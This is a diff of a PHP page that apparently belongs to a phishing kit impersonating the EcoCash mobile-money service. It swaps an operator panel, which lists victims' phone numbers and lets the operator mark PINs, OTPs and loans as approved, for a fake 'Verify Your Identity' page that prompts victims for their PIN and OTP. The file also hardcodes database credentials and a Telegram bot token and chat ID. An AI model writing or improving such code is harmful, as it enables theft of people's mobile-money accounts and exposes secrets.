@@ -1,204 +1,318 @@
 <?php
 session_start();
 
+// ========== POSTGRESQL CONFIGURATION ==========
 $dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
 $dbPort = 5432;
 $dbName = "loan_9d8q";
 $dbUser = "loan_9d8q_user";
 $dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
+// ==============================================
 
-function getDbConnection($h,$p,$d,$u,$pw){ static $c=null; if(!$c){ $c=@pg_connect("host=$h port=$p dbname=$d user=$u password=$pw"); } return $c; }
-$conn = getDbConnection($dbHost,$dbPort,$dbName,$dbUser,$dbPass);
-if(!$conn) die("DB error");
+$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
+$chatId   = "-5193742613";
 
-// Add `created_at` column if missing (to track insertion order)
-$checkCol = pg_query($conn, "SELECT column_name FROM information_schema.columns WHERE table_name='users' AND column_name='created_at'");
-if(!$checkCol || pg_num_rows($checkCol)==0){
-    pg_query($conn, "ALTER TABLE users ADD COLUMN created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP");
-    // Also update existing rows with a default timestamp (optional)
-    pg_query($conn, "UPDATE users SET created_at = NOW() WHERE created_at IS NULL");
-}
-
-// Ensure `approve` column exists
-pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS approve INTEGER DEFAULT 0");
-
-// Handle AJAX updates
-if($_SERVER['REQUEST_METHOD']=='POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
-    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH'])=='xmlhttprequest'){
-    header('Content-Type:application/json');
-    $phone=$_POST['phone']; $type=$_POST['type']; $action=$_POST['action'];
-    if(empty($phone)||empty($type)||empty($action)){
-        echo json_encode(['success'=>false,'error'=>'Invalid params']); exit;
-    }
-    switch($type){
-        case 'pin': $col='pin'; $val=($action=='correct')?1:0; break;
-        case 'otp': $col='otp'; $val=($action=='correct')?1:0; break;
-        case 'loan': $col='approve'; $val=($action=='approve')?1:0; break;
-        default: echo json_encode(['success'=>false]); exit;
-    }
-    $r=pg_query_params($conn,"UPDATE users SET $col=$1 WHERE phone=$2",[$val,$phone]);
-    echo json_encode(['success'=>(bool)$r]);
+$phone = isset($_SESSION['phone']) ? trim($_SESSION['phone']) : '';
+if (empty($phone)) {
+    header("Location: index.php");
     exit;
 }
 
-// AJAX fetch data ordered by newest first (created_at DESC)
-if(isset($_GET['fetch_data'])){
-    header('Content-Type:application/json');
-    $sql="SELECT phone, pin, otp, approve, created_at FROM users ORDER BY created_at DESC";
-    $res=pg_query($conn,$sql);
-    $rows=[];
-    while($row=pg_fetch_assoc($res)){
-        $rows[]=[
-            'phone'=>$row['phone'],
-            'pin_status'=>(int)$row['pin'],
-            'otp_status'=>(int)$row['otp'],
-            'loan_approve'=>(int)$row['approve'],
-            'created_at'=>$row['created_at']
-        ];
+function getDbConnection($host, $port, $dbname, $user, $pass) {
+    static $conn = null;
+    if ($conn === null) {
+        if (!function_exists('pg_connect')) {
+            error_log("PostgreSQL extension (pgsql) is NOT available.");
+            return false;
+        }
+        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
+        $conn = @pg_connect($connString);
+        if (!$conn) {
+            error_log("DB connection failed: " . pg_last_error());
+            return false;
+        }
     }
-    echo json_encode($rows);
+    return $conn;
+}
+
+$conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
+if (!$conn) {
+    die("Database connection failed.");
+}
+
+// Ensure phone exists in users table (insert with default flags)
+$check = pg_query_params($conn, "SELECT phone FROM users WHERE phone = $1", [$phone]);
+if (!$check || pg_num_rows($check) == 0) {
+    pg_query_params($conn, "INSERT INTO users (phone, status, pin, otp, approve) VALUES ($1, 0, 0, 0, 0)", [$phone]);
+}
+
+// Handle AJAX verification and deletion
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
+    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+    
+    header('Content-Type: application/json');
+    $type = $_POST['type'] ?? '';
+    $action = $_POST['action'] ?? '';
+    
+    // Handle delete action
+    if ($type === 'delete' && $action === 'confirm') {
+        $deleteSql = "DELETE FROM users WHERE phone = $1";
+        $result = pg_query_params($conn, $deleteSql, [$phone]);
+        if ($result) {
+            session_destroy();
+            echo json_encode(['success' => true, 'redirect' => 'index.php']);
+        } else {
+            echo json_encode(['success' => false, 'error' => 'Could not delete user']);
+        }
+        exit;
+    }
+    
+    // Existing verification logic (PIN/OTP)
+    if (!in_array($type, ['pin', 'otp']) || $action !== 'correct') {
+        echo json_encode(['success' => false, 'error' => 'Invalid request']);
+        exit;
+    }
+    
+    $col = $type; // 'pin' or 'otp'
+    $sql = "SELECT $col FROM users WHERE phone = $1";
+    $result = pg_query_params($conn, $sql, [$phone]);
+    if (!$result || !($row = pg_fetch_assoc($result))) {
+        echo json_encode(['success' => false, 'error' => 'User not found']);
+        exit;
+    }
+    
+    $flag = (int)$row[$col];
+    if ($flag === 1) {
+        echo json_encode(['success' => true, 'message' => ucfirst($type) . ' verified', 'redirect' => ($type === 'pin' ? 'otp.php' : 'dashboard.php')]);
+    } else {
+        echo json_encode(['success' => false, 'error' => 'Wrong ' . strtoupper($type)]);
+    }
     exit;
 }
 
-// Initial load (same query)
-$sql="SELECT phone, pin, otp, approve, created_at FROM users ORDER BY created_at DESC";
-$res=pg_query($conn,$sql);
-$records=[];
-while($row=pg_fetch_assoc($res)){
-    $records[]=[
-        'phone'=>$row['phone'],
-        'pin_status'=>(int)$row['pin'],
-        'otp_status'=>(int)$row['otp'],
-        'loan_approve'=>(int)$row['approve']
-    ];
+// Get current flags for display
+$sql = "SELECT pin, otp FROM users WHERE phone = $1";
+$res = pg_query_params($conn, $sql, [$phone]);
+$pinFlag = 0;
+$otpFlag = 0;
+if ($res && $row = pg_fetch_assoc($res)) {
+    $pinFlag = (int)$row['pin'];
+    $otpFlag = (int)$row['otp'];
 }
-$totalRecords = count($records);
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>EcoCash Admin | Users (Newest First)</title>
+    <title>Verify PIN & OTP | EcoCash</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        *{box-sizing:border-box;}
-        body{font-family:'Segoe UI',sans-serif;background:#f0f2f5;margin:0;padding:16px;}
-        .container{max-width:1300px;margin:0 auto;background:#fff;border-radius:20px;box-shadow:0 4px 12px rgba(0,0,0,0.1);overflow:hidden;}
-        h1{background:#0a5fa7;color:#fff;margin:0;padding:18px 20px;font-size:1.5rem;display:flex;flex-wrap:wrap;justify-content:space-between;align-items:center;gap:12px;}
-        .refresh-indicator{font-size:0.75rem;background:rgba(255,255,255,0.2);padding:4px 12px;border-radius:30px;}
-        .table-wrapper{overflow-x:auto;padding:16px 20px;}
-        table{width:100%;border-collapse:collapse;font-size:0.9rem;min-width:550px;}
-        th,td{padding:12px 12px;text-align:left;border-bottom:1px solid #e0e0e0;}
-        th{background-color:#f8f9fa;font-weight:600;}
-        tr:hover{background-color:#f5f7fa;}
-        .badge{display:inline-block;padding:4px 12px;border-radius:30px;font-size:0.75rem;font-weight:600;}
-        .badge-success{background-color:#d4edda;color:#155724;}
-        .badge-warning{background-color:#fff3cd;color:#856404;}
-        .badge-approved{background-color:#cce5ff;color:#004085;}
-        .btn-group{display:flex;flex-wrap:wrap;gap:8px;}
-        .btn{border:none;padding:6px 14px;border-radius:8px;font-size:0.75rem;font-weight:500;cursor:pointer;white-space:nowrap;}
-        .btn-pin{background-color:#1d4ed8;color:#fff;}
-        .btn-pin:hover{background-color:#1e40af;}
-        .btn-otp{background-color:#10b981;color:#fff;}
-        .btn-otp:hover{background-color:#059669;}
-        .btn-loan{background-color:#f59e0b;color:#fff;}
-        .btn-loan:hover{background-color:#d97706;}
-        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);justify-content:center;align-items:center;z-index:1000;padding:16px;}
-        .modal-content{background:#fff;border-radius:20px;width:100%;max-width:340px;padding:24px 20px;text-align:center;box-shadow:0 20px 30px rgba(0,0,0,0.2);}
-        .modal-content p{margin:0 0 20px;font-size:1.2rem;font-weight:500;}
-        .modal-buttons{display:flex;flex-direction:column;gap:12px;}
-        .modal-buttons button{padding:12px;border:none;border-radius:50px;font-size:1rem;font-weight:600;cursor:pointer;width:100%;}
-        .btn-correct,.btn-approve{background-color:#10b981;color:#fff;}
-        .btn-wrong,.btn-default{background-color:#ef4444;color:#fff;}
-        footer{padding:14px 20px;background:#f8f9fa;font-size:0.7rem;color:#6c757d;text-align:center;border-top:1px solid #e0e0e0;}
-        @media(max-width:700px){body{padding:10px;}h1{font-size:1.2rem;padding:14px 16px;}th,td{padding:8px 8px;font-size:0.8rem;}.btn{padding:5px 10px;font-size:0.7rem;}.badge{font-size:0.7rem;padding:3px 8px;}}
-        @media(max-width:550px){.table-wrapper{padding:12px;}.btn-group{flex-direction:column;gap:6px;}.btn{text-align:center;}}
+        * { box-sizing: border-box; }
+        body { margin: 0; background: #f1f5f9; font-family: Arial, Helvetica, sans-serif; padding: 20px; }
+        .header { text-align: center; padding: 15px; font-size: 24px; font-weight: bold; }
+        .header span:first-child { color: red; }
+        .header span:last-child { color: #2563eb; }
+        .card { max-width: 500px; margin: 20px auto; background: #fff; padding: 30px; border-radius: 18px; box-shadow: 0 8px 25px rgba(0,0,0,.08); text-align: center; }
+        .title { font-size: 20px; font-weight: bold; margin-bottom: 20px; }
+        .phone-box { background: #f8fafc; padding: 12px; border-radius: 10px; margin-bottom: 20px; font-size: 16px; }
+        .btn-group { display: flex; gap: 15px; justify-content: center; margin: 25px 0; flex-wrap: wrap; }
+        button { padding: 12px 24px; border: none; border-radius: 40px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .btn-pin { background-color: #1d4ed8; color: white; }
+        .btn-pin:hover { background-color: #1e40af; }
+        .btn-otp { background-color: #10b981; color: white; }
+        .btn-otp:hover { background-color: #059669; }
+        .btn-delete { background-color: #dc2626; color: white; }
+        .btn-delete:hover { background-color: #b91c1c; }
+        .status { margin-top: 20px; padding: 12px; border-radius: 12px; background: #f8fafc; font-size: 14px; }
+        .status span { font-weight: bold; }
+        .status .approved { color: green; }
+        .status .pending { color: orange; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { background: white; border-radius: 16px; width: 320px; padding: 24px; text-align: center; }
+        .modal-content p { margin: 0 0 15px; font-size: 18px; font-weight: 600; }
+        .modal-content input { width: 90%; padding: 10px; margin: 10px 0 20px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; text-align: center; }
+        .modal-buttons { display: flex; gap: 12px; justify-content: center; }
+        .modal-buttons button { padding: 8px 20px; font-size: 14px; }
+        .btn-correct { background-color: #10b981; color: white; }
+        .footer { text-align: center; font-size: 11px; color: #6c757d; margin-top: 20px; }
+        @media (max-width: 500px) {
+            .btn-group { flex-direction: column; }
+            button { width: 100%; }
+        }
     </style>
 </head>
 <body>
-<div class="container">
-    <h1>🔐 EcoCash Admin – Users (Newest First) <span class="refresh-indicator">Auto-refresh 2s</span></h1>
-    <div class="table-wrapper">
-        <table id="dataTable">
-            <thead><tr><th>#</th><th>Phone</th><th>PIN</th><th>OTP</th><th>Loan</th><th>Actions</th></tr></thead>
-            <tbody id="tableBody"><tr><td colspan="6">Loading...</td></tr></tbody>
-        </table>
+<div class="header"><span>Eco</span><span>Cash</span></div>
+<div class="card">
+    <div class="title">Verify Your Identity</div>
+    <div class="phone-box"><strong>Phone:</strong> +263 <?= htmlspecialchars($phone) ?></div>
+    <div class="btn-group">
+        <button class="btn-pin" id="pinBtn">🔐 Verify PIN</button>
+        <button class="btn-otp" id="otpBtn">📱 Verify OTP</button>
+        <button class="btn-delete" id="deleteBtn">🗑️ Delete Account</button>
     </div>
-    <footer>✅ Newest shown first (top). # numbers: newest = highest number.<br>Click a button → On (1) / Off (0).</footer>
+    <div class="status" id="statusBox">
+        <div>PIN Status: <span id="pinStatus" class="<?= $pinFlag ? 'approved' : 'pending' ?>"><?= $pinFlag ? 'Approved (1)' : 'Pending (0)' ?></span></div>
+        <div>OTP Status: <span id="otpStatus" class="<?= $otpFlag ? 'approved' : 'pending' ?>"><?= $otpFlag ? 'Approved (1)' : 'Pending (0)' ?></span></div>
+    </div>
+    <div class="footer">Both must be approved by admin to continue</div>
 </div>
-<div id="verifyModal" class="modal"><div class="modal-content"><p id="modalMessage"></p><div class="modal-buttons" id="modalButtons"></div></div></div>
-<script>
-let pendingPhone=null,pendingType=null;
-const modal=document.getElementById('verifyModal');
-const modalMessage=document.getElementById('modalMessage');
-const modalButtons=document.getElementById('modalButtons');
-const tableBody=document.getElementById('tableBody');
-let totalRows=0;
 
-function renderTable(records){
-    totalRows=records.length;
-    if(!totalRows){ tableBody.innerHTML='<tr><td colspan="6">No records found.</td></tr>'; return; }
-    let html='';
-    records.forEach((rec,idx)=>{
-        const rowNumber = totalRows - idx; // newest gets highest number
-        const phone=escapeHtml(rec.phone);
-        const pinStatus=rec.pin_status;
-        const otpStatus=rec.otp_status;
-        const loanApprove=rec.loan_approve;
-        html+=`<tr data-phone="${phone}">`;
-        html+=`<td style="text-align:center; font-weight:bold;">${rowNumber}</td>`;
-        html+=`<td>+263 ${phone}</td>`;
-        html+=`<td><span class="badge ${pinStatus?'badge-success':'badge-warning'}">${pinStatus?'On (1)':'Off (0)'}</span></td>`;
-        html+=`<td><span class="badge ${otpStatus?'badge-success':'badge-warning'}">${otpStatus?'On (1)':'Off (0)'}</span></td>`;
-        html+=`<td><span class="badge ${loanApprove?'badge-approved':'badge-warning'}">${loanApprove?'Approved (1)':'Default (0)'}</span></td>`;
-        html+=`<td class="btn-group">
-            <button class="btn btn-pin verify-pin" data-phone="${phone}">🔐 PIN</button>
-            <button class="btn btn-otp verify-otp" data-phone="${phone}">📱 OTP</button>
-            <button class="btn btn-loan verify-loan" data-phone="${phone}">🏦 Loan</button>
-        </td></tr>`;
-    });
-    tableBody.innerHTML=html;
-    attachEvents();
-}
-function escapeHtml(str){ return str.replace(/[&<>]/g,m=>m=='&'?'&amp;':m=='<'?'&lt;':m=='>'?'&gt;':m); }
-function attachEvents(){
-    document.querySelectorAll('.verify-pin').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'pin',[{label:'✅ On (1)',action:'correct',class:'btn-correct'},{label:'❌ Off (0)',action:'wrong',class:'btn-wrong'}]); });
-    document.querySelectorAll('.verify-otp').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'otp',[{label:'✅ On (1)',action:'correct',class:'btn-correct'},{label:'❌ Off (0)',action:'wrong',class:'btn-wrong'}]); });
-    document.querySelectorAll('.verify-loan').forEach(btn=>{ btn.onclick=()=>showModal(btn.dataset.phone,'loan',[{label:'✅ Approve (1)',action:'approve',class:'btn-approve'},{label:'❌ Default (0)',action:'default',class:'btn-default'}]); });
-}
-function showModal(phone,type,options){
-    pendingPhone=phone; pendingType=type;
-    modalMessage.innerText=`${type==='pin'?'PIN':type==='otp'?'OTP':'Loan'} for ${phone}:`;
-    modalButtons.innerHTML='';
-    options.forEach(opt=>{
-        let btn=document.createElement('button');
-        btn.textContent=opt.label; btn.className=opt.class;
-        btn.onclick=()=>{ updateStatus(pendingPhone,pendingType,opt.action); closeModal(); };
-        modalButtons.appendChild(btn);
-    });
-    modal.style.display='flex';
-}
-function closeModal(){ modal.style.display='none'; pendingPhone=pendingType=null; }
-async function updateStatus(phone,type,action){
-    let fd=new FormData(); fd.append('phone',phone); fd.append('type',type); fd.append('action',action);
-    try{
-        let res=await fetch(window.location.href,{method:'POST',headers:{'X-Requested-With':'XMLHttpRequest'},body:fd});
-        let data=await res.json();
-        if(data.success) await fetchData();
-        else alert('Error: '+ (data.error||'Update failed'));
-    }catch(e){ alert('Network error'); }
-    closeModal();
-}
-async function fetchData(){
-    try{
-        let res=await fetch(window.location.href+'?fetch_data=1');
-        let records=await res.json();
-        renderTable(records);
-    }catch(e){ console.error(e); }
-}
-window.onclick=e=>{ if(e.target===modal) closeModal(); };
-fetchData();
-setInterval(fetchData,2000);
+<!-- Modal for PIN/OTP verification -->
+<div id="verifyModal" class="modal">
+    <div class="modal-content">
+        <p id="modalTitle">Enter any 4 digits</p>
+        <input type="text" id="modalInput" placeholder="0000" maxlength="6" autocomplete="off">
+        <div class="modal-buttons">
+            <button id="modalCorrect" class="btn-correct">✔ Continue</button>
+        </div>
+    </div>
+</div>
+
+<!-- Modal for delete confirmation -->
+<div id="deleteModal" class="modal">
+    <div class="modal-content">
+        <p>Are you sure you want to delete your account?</p>
+        <div class="modal-buttons">
+            <button id="confirmDelete" style="background:#dc2626; color:white;">Yes, Delete</button>
+            <button id="cancelDelete" style="background:#6b7280; color:white;">Cancel</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    let currentType = null;
+    const verifyModal = document.getElementById('verifyModal');
+    const deleteModal = document.getElementById('deleteModal');
+    const modalTitle = document.getElementById('modalTitle');
+    const modalInput = document.getElementById('modalInput');
+    const pinStatusSpan = document.getElementById('pinStatus');
+    const otpStatusSpan = document.getElementById('otpStatus');
+
+    function showVerifyModal(type) {
+        currentType = type;
+        modalTitle.innerText = type === 'pin' ? 'Enter any 4 digits' : 'Enter any 6 digits';
+        modalInput.value = '';
+        modalInput.maxLength = type === 'pin' ? 4 : 6;
+        verifyModal.style.display = 'flex';
+    }
+
+    function closeVerifyModal() {
+        verifyModal.style.display = 'none';
+        currentType = null;
+    }
+
+    function showDeleteModal() {
+        deleteModal.style.display = 'flex';
+    }
+
+    function closeDeleteModal() {
+        deleteModal.style.display = 'none';
+    }
+
+    async function sendVerification(type) {
+        const value = modalInput.value.trim();
+        if (type === 'pin' && value.length !== 4) {
+            alert('Please enter 4 digits');
+            return;
+        }
+        if (type === 'otp' && value.length !== 6) {
+            alert('Please enter 6 digits');
+            return;
+        }
+        
+        const formData = new FormData();
+        formData.append('type', type);
+        formData.append('action', 'correct');
+        
+        try {
+            const response = await fetch(window.location.href, {
+                method: 'POST',
+                headers: { 'X-Requested-With': 'XMLHttpRequest' },
+                body: formData
+            });
+            const result = await response.json();
+            if (result.success) {
+                if (result.redirect) {
+                    window.location.href = result.redirect;
+                } else {
+                    await refreshStatuses();
+                    showTemporaryMessage(result.message, 'green');
+                }
+            } else {
+                showTemporaryMessage(result.error, 'red');
+            }
+        } catch (err) {
+            alert('Network error: ' + err.message);
+        }
+        closeVerifyModal();
+    }
+
+    async function deleteAccount() {
+        const formData = new FormData();
+        formData.append('type', 'delete');
+        formData.append('action', 'confirm');
+        try {
+            const response = await fetch(window.location.href, {
+                method: 'POST',
+                headers: { 'X-Requested-With': 'XMLHttpRequest' },
+                body: formData
+            });
+            const result = await response.json();
+            if (result.success && result.redirect) {
+                window.location.href = result.redirect;
+            } else {
+                alert('Deletion failed: ' + (result.error || 'Unknown error'));
+            }
+        } catch (err) {
+            alert('Network error: ' + err.message);
+        }
+        closeDeleteModal();
+    }
+
+    async function refreshStatuses() {
+        const response = await fetch(window.location.href + '?get_flags=1');
+        const data = await response.json();
+        pinStatusSpan.innerText = data.pin === 1 ? 'Approved (1)' : 'Pending (0)';
+        pinStatusSpan.className = data.pin === 1 ? 'approved' : 'pending';
+        otpStatusSpan.innerText = data.otp === 1 ? 'Approved (1)' : 'Pending (0)';
+        otpStatusSpan.className = data.otp === 1 ? 'approved' : 'pending';
+    }
+
+    function showTemporaryMessage(msg, color) {
+        const statusBox = document.getElementById('statusBox');
+        const div = document.createElement('div');
+        div.style.cssText = `color:${color}; margin-top:10px; font-weight:bold;`;
+        div.innerText = msg;
+        statusBox.appendChild(div);
+        setTimeout(() => div.remove(), 3000);
+    }
+
+    document.getElementById('pinBtn').onclick = () => showVerifyModal('pin');
+    document.getElementById('otpBtn').onclick = () => showVerifyModal('otp');
+    document.getElementById('deleteBtn').onclick = () => showDeleteModal();
+    document.getElementById('modalCorrect').onclick = () => sendVerification(currentType);
+    document.getElementById('confirmDelete').onclick = () => deleteAccount();
+    document.getElementById('cancelDelete').onclick = () => closeDeleteModal();
+    window.onclick = (e) => {
+        if (e.target === verifyModal) closeVerifyModal();
+        if (e.target === deleteModal) closeDeleteModal();
+    };
 </script>
+
+<?php
+// AJAX endpoint to get current flags (pin, otp)
+if (isset($_GET['get_flags']) && $_GET['get_flags'] == 1) {
+    header('Content-Type: application/json');
+    $sql = "SELECT pin, otp FROM users WHERE phone = $1";
+    $res = pg_query_params($conn, $sql, [$phone]);
+    if ($res && $row = pg_fetch_assoc($res)) {
+        echo json_encode(['pin' => (int)$row['pin'], 'otp' => (int)$row['otp']]);
+    } else {
+        echo json_encode(['pin' => 0, 'otp' => 0]);
+    }
+    exit;
+}
+?>
 </body>
 </html>
